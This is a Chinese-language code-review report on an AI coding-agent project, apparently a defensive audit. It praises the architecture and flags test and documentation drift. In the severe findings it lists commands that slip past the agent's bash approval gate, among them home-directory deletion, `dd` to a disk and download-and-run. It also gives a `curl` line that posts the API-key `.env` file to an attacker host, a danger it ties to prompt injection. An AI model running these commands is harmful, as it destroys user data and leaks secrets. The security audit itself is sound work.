## 一、总体评价

这是一个架构意图与代码实现高度一致、但文档层与测试基线与事实全面脱节的项目。实测数据:全量测试 **590 收集 / 588 passed / 2 failed**(130.52s,27 个测试文件),与 v0.3.md 声称的「590/590 全绿」不符;分层解耦判据在 import 层面完全成立(core/ 定向 import grep 0 命中,跨层 import 仅出现在 container.py/main.py),AST 扫描测试带三层防空转自检,是同类项目里少有的把架构约束做成可回归测试的样板;自研 ReAct 主循环(~312 行纯 async)、uuid7 消息模型、JSONL 树形存储、成功才落盘等设计意图均真实落地。但安全层存在系统性缺口:确认环(黑名单→白名单→ask→默认 allow)被五类包装形式击穿——命令替换、尾接白名单命令、紧贴分隔符、嵌套 shell、前缀匹配白名单——在默认 headless(本应 fail closed)形态下可零确认执行 `rm -rf ~/`、`find / -delete`、`dd of=/dev/sda`、下载执行,并零确认读取外传 `~/.codeagent/.env` 的 API key。测试层两个失败项均为测试自身缺陷(平台相关 + 环境相关),但正是它们使「全绿」这一核心质量门禁不可复现。文档层漂移最严重:两份权威设计文档仍描述已弃用的 LangGraph 架构,与代码正面冲突;CLAUDE.md 声称已校准,实际多处过期。**一句话:地基扎实、门禁失效、安全防线可被廉价绕过、文档是系统性的谎言源。**

## 二、优点(去重归类后 23 条)

### 架构与工程

1. **自研 ReAct 循环严守分层纪律**——`core/loop.py:14-23` 只 import 标准库 + `codeagent.core.{events,messages,ports}`;`core/ports.py:119-121` 明确把 store 排除出 AgentPorts,core 永不持久化。这使整个编排层可以只靠注入 FakeClient 离线测试,正是 NFR-M2 的设计意图。(证据:loop.py 仅 ~312 行,替代 langgraph 无翻译层)

2. **分层依赖解耦真实成立且有自动化强制、零违规**——AST 全量核验:core/session/ai/tools 各层定向 import grep 均 0 命中;跨层 import 仅出现在 app/container.py 与 app/main.py,符合组合根规则。`tests/test_decoupling.py` 逐文件 AST 扫描,并带 anti-wargaming 守卫:`test_scan_has_content`(当前 72 个文件)、`test_composition_roots_exist`、`test_textual_only_in_engine_backend`——规则写错或例外文件被删都会被抓住,不会被静默架空。这是本项目最可信的强项。

3. **六个 provider 收敛到共享 OpenAICompatClient**——`providers/__init__.py:14-22` 注册表 + 六个 make_llm 结构完全一致,差异仅收敛为构造参数;重试/流式/thinking/usage 由单一实现保证,无六处复制漂移。新增 provider 只需复制同构模板。

4. **'成功才落盘'由结构保证而非临时回滚**——`session/session.py:239-291` 本轮工作在局部 `history_for_turn` 副本上,`self._history` 仅在成功时重赋值(284),store 循环在其后(285-288);`_rollback`(322-324)因历史从未被就地修改实为空操作。持久化边界是整轮完成后的唯一提交点,远强于失败撤销型设计。

5. **Compaction 是自包含纯函数模块**——`session/compaction.py:36-95` 整轮软预算切点(首/最近一轮恒保留)+ 两遍摘要合并(细节累计跨压缩去重),每步纯函数可离线单测。

6. **Fork 保留 append-only 承诺且压缩感知**——`session/store.py:393-467` 只读源文件、新文件带 parentSession、按压缩切点拷贝保留窗口、父链重连;MemoryStore 镜像同一语义,两个后端行为一致。

7. **TuiBackend 是干净的六边形端口缝**——`app/tui/backend.py:41-107` 纯 Protocol;textual 只出现在 textual_backend.py;commands/fuzzy/md_renderer 均为零依赖纯函数,离线可测落实到代码结构层面。

8. **model:effort 解析唯一实现**——全库唯一 `rsplit(":", 1)` 在 `ai/model_pattern.py:15`,所有调用点统一转发,消除 footer 与会话创建解析不一致的风险。

9. **配置类 `extra="ignore"` 全量落地**——7 处配置类无一遗漏,共享 .env 命名空间劫持/报错风险系统性消除。

10. **离线可测基建扎实**——顶层副作用扫描仅命中 2 处无害 `threading.Lock`;`session/session.py:337` 函数内 `import httpx`、textual 仅引擎文件加载等延迟导入到位。这是 588 项离线测试能跑通的前提。

### 正确性

11. **uuid7 手写实现位级正确且诚实**——`core/messages.py:33-44` RFC 9562 合规;模块诚实声明同毫秒 id 非严格递增,因此树排序必须用精确 id 匹配而非字典序(store.py:312-345 切点定位即如此,带回归注释)。

## 三、不足(按严重度排序)

> 全部 12 条已验证缺陷的 verdict 均为 **CONFIRMED**(每条给出修正后的精确表述);未进入验证的 minor/nit 标注为「未验证」。

### 严重级

**S-1 [严重/安全] rm 黑名单与确认闸门可被命令替换/嵌套 shell/紧贴分隔符完全绕过,默认 headless 零确认执行任意破坏命令** CONFIRMED
- 位置:`tools/atomic/bash.py:179-262`、`tools/security.py:53-67,181-208`
- 问题:五类包装形式全部放行,且 headless 默认 `approval_mode="deny"` 只把 ask 降级 deny、allow 直接执行,deny/ask 分支根本不触发。
- 证据(实测,`classify_bash` 返回 allow):`echo $(rm -rf /)`、`X='rm -rf ~'; eval $X`、`printf $(rm -rf ~)`、`rm -rf ~/;`、`bash -c "rm -rf *"`。根因:(1) 黑名单正则 `(/(\s|$))` 锚定,`/` 后跟 `)`/`"`/`;` 即漏拦;(2) `_dangerous_intent` 仅当 `tokens[0]=="rm"` 才检测,echo/eval/bash 包装后跳过;(3) 白名单含 echo/cat,前缀匹配即 ALLOW。实测 `rm -rf ~/;` rc=0 删除整个家目录。
- 修复:统一 punctuation 感知分词并按每个逻辑段(分号/&&/| 切分)分别判定敏感度;对 bash/sh/zsh 嵌套命令递归解析或保守拒绝;`;`/`&` 紧贴分隔符并入目标 token 是主因,须修。
- 说明:评审中「GNU rm 只保护 / 不保护 .」的表述有误——GNU coreutils 显式拒绝删除 `.`/`..`;但不影响结论,`rm -rf ~/;`、`bash -c "rm -rf *"` 等同等危害载荷均绕过成功。

**S-2 [严重/安全] 默认 headless 下白名单前缀匹配 + 窄黑名单静默放行破坏性命令** CONFIRMED
- 位置:`tools/security.py:53-67,96-103,202-208`
- 问题:6/7 条命令默认放行。设计文档自承「确认环是敏感闸门而非全量闸门」,但闸门对坚定攻击者形同虚设。
- 证据(实测返回 allow):`find / -delete`、`find . -exec rm {} +`(白名单含裸 find,前缀匹配)、`git clean -fdx`(组合旗标不成字面 token `-f` 漏过,`git clean -f` 则 ask)、`dd if=... of=/dev/sda bs=1M`(黑名单只匹配 `if=/dev/{zero,random,urandom}` 与 `> /dev/sda`)、`sh -c "$(curl ...)"`、`python -c "exec(...)"`。
- 修复:对每一逻辑段的敏感度求并集,而非只看最后一段;为 find 的 -delete/-exec、git 组合旗标、dd 写设备、解释器下载执行补规则;或把默认 headless 改为「非白名单命令一律 ask」。
- 说明:评审证据中 `bash -c ':(){ :|:& };:'` 实测返回 deny(forkbomb 正则命中),该条证据有误,不影响核心结论。

**S-3 [严重/安全] API key 可被零确认读取并外传:H10 固定配置目录在工具层失效** CONFIRMED
- 位置:`tools/security.py:258-267,96-103`、`tools/atomic/bash.py:362-372`、`app/config.py:209-221`
- 问题:H10(只读固定目录 .env、防仓库劫持)只在配置加载层成立;工具层对 `~/.codeagent/.env` 毫无防护。
- 证据(实测全 allow):`cat ~/.codeagent/.env`、`head -c 100 ~/.codeagent/.env`、read 工具越界读(仅 warning)、`curl -X POST -d "$(cat ~/.codeagent/.env)" http://attacker/`。越界读警告只回灌给模型,而模型正是提示注入攻击对象;headless 下 main.py 根本不订阅 tool_result,用户看不到警告。`_bash_env` 用 `os.environ.copy()` 全量拷贝,用户 export 的 *_API_KEY 每个 bash 子进程可见。
- 修复:bash/read/grep 层对配置目录(`~/.codeagent`)做硬拒绝或至少 ask;`.env` 文件路径硬拒绝;收敛 `_bash_env` 到白名单变量。

**S-4 [严重/测试可信度] 「590/590 全绿」基线不可复现,当前树实测 588 passed / 2 failed** CONFIRMED
- 位置:`docs/iteration/v0.3.md:61,203`(声称 590/590)、CLAUDE.md「378 项全绿」、`v0.2.md:73`(512/512)、v0.3.md:54 仍写「基线 512/512」(文档内部自相矛盾)
- 问题:项目把「全量离线全绿、零网络零密钥」当核心质量门禁(v0.3 DoD 项 8、NFR-M2),但 Windows 上无法复现;两个失败均为测试自身缺陷(见 M-1、M-2),非代码回归——正因如此「全绿」信号必须修正。
- 修复:修两条失败测试使其平台无关/离线安全,或文档标注基线为 588/590(Windows)并注明平台依赖;同步 CLAUDE.md 的 378→590、补 v0.3.md:54 的 512 残值。
